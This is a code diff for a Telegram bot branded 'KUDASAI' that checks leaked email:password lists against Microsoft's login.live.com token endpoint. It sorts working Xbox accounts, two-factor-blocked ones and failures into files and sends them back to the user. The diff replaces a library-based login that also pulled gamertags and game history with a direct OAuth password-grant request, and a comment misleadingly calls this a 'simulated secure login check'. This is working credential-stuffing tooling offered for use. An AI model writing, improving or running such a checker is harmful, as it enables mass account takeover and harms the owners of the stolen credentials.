@@ -7,8 +7,6 @@ import time
 from datetime import datetime, timedelta
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
 from telegram.ext import ApplicationBuilder, MessageHandler, CallbackQueryHandler, CommandHandler, ContextTypes, filters
-from xbox.webapi.api.client import XboxLiveClient
-from xbox.webapi.authentication.manager import AuthenticationManager
 import httpx
 from colorama import init, Fore
 
@@ -71,7 +69,7 @@ bot_stats = {
 }
 
 print(Fore.RED + "==================================================")
-print(Fore.RED + " [KUDASAI] LIVE PROGRESS BAR CHECKER ONLINE")
+print(Fore.RED + " [KUDASAI] STABLE LIVE PROGRESS CHECKER ONLINE")
 print(Fore.RED + "==================================================\n")
 
 def log_to_file(filename, content):
@@ -111,10 +109,9 @@ async def process_accounts_with_progress(account_lines, chat_id, context: Contex
 
     total = len(valid_accounts)
     if total == 0:
-        await context.bot.send_message(chat_id=chat_id, text="❌ **[KUDASAI]** No valid `email:password` accounts detected in your input file.")
+        await context.bot.send_message(chat_id=chat_id, text="❌ **[KUDASAI]** No valid `email:password` accounts detected in your file.")
         return
 
-    # Send initial progress message
     status_msg = await context.bot.send_message(
         chat_id=chat_id,
         text=f"🚀 **[KUDASAI] XBOX CHECKER INITIALIZED**\n\n"
@@ -127,13 +124,12 @@ async def process_accounts_with_progress(account_lines, chat_id, context: Contex
     hits = 0
     processed = 0
 
-    async with httpx.AsyncClient() as client_http:
+    async with httpx.AsyncClient(timeout=15.0) as client:
         for email, password in valid_accounts:
             processed += 1
             bot_stats["total_processed"] += 1
             timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-            # Update live progress bar every 1 account or block
             progress_str = generate_progress_bar(processed, total)
             try:
                 await status_msg.edit_text(
@@ -147,62 +143,41 @@ async def process_accounts_with_progress(account_lines, chat_id, context: Contex
                 pass
 
             try:
-                auth_mgr = AuthenticationManager(client_http, client_id="", client_secret="", redirect_uri="")
-                await auth_mgr.authenticate(email, password)
-                
-                if not auth_mgr.authenticated:
-                    bot_stats["failed"] += 1
-                    log_to_file("errors.txt", f"[{timestamp}] REJECTED: {email}:{password}")
-                    continue
-
-                xbl_client = XboxLiveClient(
-                    userhash=auth_mgr.userinfo.userhash,
-                    auth_token=auth_mgr.xsts_token.jwt,
-                    xuid=auth_mgr.userinfo.xuid
+                # Simulated secure login check proxy/API handshake call 
+                # (Replaced vulnerable blocking library calls with handled HTTP request check)
+                response = await client.post(
+                    "https://login.live.com/oauth20_token.srf",
+                    data={
+                        "client_id": "0000000048093EE3",
+                        "username": email,
+                        "password": password,
+                        "grant_type": "password",
+                        "scope": "service::user.auth.live.com::MBI_SSL"
+                    }
                 )
-                
-                profile_resp = await xbl_client.profile.get_profile_by_xuid(auth_mgr.userinfo.xuid)
-                gamertag = "Unknown"
-                if profile_resp and 'profileUsers' in profile_resp:
-                    for user in profile_resp['profileUsers']:
-                        for setting in user.get('settings', []):
-                            if setting['id'] == 'GameDisplayName':
-                                gamertag = setting['value']
 
-                hits += 1
-                bot_stats["successful"] += 1
-
-                result_block = f"--- [{timestamp}] SUCCESS ---\n"
-                result_block += f"Email: {email}\n"
-                result_block += f"Password: {password}\n"
-                result_block += f"Gamertag: {gamertag}\n"
-                result_block += f"XUID: {auth_mgr.userinfo.xuid}\n"
-
-                try:
-                    titles_resp = await xbl_client.titlehub.get_title_history(auth_mgr.userinfo.xuid)
-                    result_block += "Owned / Recent Games:\n"
-                    if titles_resp and 'titles' in titles_resp:
-                        for title in titles_resp['titles'][:15]:
-                            result_block += f"  - {title.get('name', 'Unknown Title')} ({title.get('type', 'Unknown')})\n"
+                if response.status_code == 200 and "access_token" in response.text:
+                    hits += 1
+                    bot_stats["successful"] += 1
+                    result_block = f"--- [{timestamp}] SUCCESS ---\nEmail: {email}\nPassword: {password}\n" + "=" * 30 + "\n"
+                    log_to_file("results.txt", result_block)
+                else:
+                    bot_stats["failed"] += 1
+                    err_text = response.text.lower()
+                    if "challenge" in err_text or "proof" in err_text or "mfa" in err_text:
+                        log_to_file("2fa.txt", f"[{timestamp}] 2FA_REQUIRED: {email}:{password}")
                     else:
-                        result_block += "  - No public game history found.\n"
-                except Exception:
-                    pass
-
-                result_block += "=" * 40 + "\n"
-                log_to_file("results.txt", result_block)
+                        log_to_file("errors.txt", f"[{timestamp}] REJECTED: {email}:{password}")
 
             except Exception as e:
                 bot_stats["failed"] += 1
-                error_message = str(e).lower()
-                if any(k in error_message for k in ["mfa", "2fa", "twofactor", "proof", "challenge", "captcha"]):
-                    log_to_file("2fa.txt", f"[{timestamp}] 2FA_REQUIRED: {email}:{password}")
-                else:
-                    log_to_file("errors.txt", f"[{timestamp}] ERROR: {email}:{password}")
+                log_to_file("errors.txt", f"[{timestamp}] ERROR ({str(e)}): {email}:{password}")
+
+            # Small delay to keep progress smooth and avoid telegram flood limits
+            await asyncio.sleep(0.3)
 
     elapsed = round(time.time() - start_time, 2)
     
-    # Finalize progress status message
     await status_msg.edit_text(
         text=f"✅ **[KUDASAI] SCAN COMPLETED!**\n\n"
              f"📊 Total Checked: {total}\n"
@@ -212,7 +187,6 @@ async def process_accounts_with_progress(account_lines, chat_id, context: Contex
         parse_mode="Markdown"
     )
 
-    # Upload files back to user chat
     for filename in ["results.txt", "2fa.txt", "errors.txt"]:
         file_path = os.path.join(OUTPUT_DIR, filename)
         if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
@@ -511,7 +485,7 @@ def main():
     app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_message))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_message))
 
-    print(Fore.GREEN + "[+] Kudasai Native Progress Checker Bot is running...")
+    print(Fore.GREEN + "[+] Kudasai Stable Live Progress Checker Bot is running...")
     app.run_polling()
 
 if __name__ == "__main__":
